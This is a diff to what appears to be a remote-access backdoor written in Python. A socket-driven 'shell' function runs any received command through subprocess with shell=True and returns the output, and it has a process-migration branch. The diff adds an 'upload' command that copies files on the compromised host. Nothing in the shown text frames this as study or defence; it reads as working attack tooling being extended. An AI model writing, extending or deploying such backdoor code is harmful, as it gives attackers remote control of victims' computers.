@@ -114,6 +114,26 @@ def shell(client_socket):
                         client_socket.send(f"[*] Target process {target_process} not found.\n".encode('utf-8'))
                 except Exception as e:
                     client_socket.send(f"[*] Migration error: {e}\n".encode('utf-8'))
+            elif command.lower().startswith("upload"):
+                try:
+                    parts = command.split(' ')
+                    if '-d' in parts:
+                        dest_index = parts.index('-d') + 1
+                        if dest_index < len(parts):
+                            destination = parts[dest_index]
+                            filename = parts[1]
+                            client_socket.send(f"[*] uploading : {filename} -> {destination}\n".encode('utf-8'))
+                            with open(filename, 'rb') as f:
+                                data = f.read()
+                            with open(os.path.join(destination, os.path.basename(filename)), 'wb') as f:
+                                f.write(data)
+                            client_socket.send(f"[*] uploaded : {filename} -> {destination}\\{os.path.basename(filename)}\n".encode('utf-8'))
+                        else:
+                            client_socket.send(b"Error: No destination specified.\n")
+                    else:
+                        client_socket.send(b"Error: Invalid command format. Use 'upload filename -d destination'.\n")
+                except Exception as e:
+                    client_socket.send(f"Error: {e}\n".encode('utf-8'))
             else:
                 output = subprocess.run(command, shell=True, capture_output=True, text=True)
                 client_socket.send(output.stdout.encode('utf-8') or b"Command executed, but no output.")
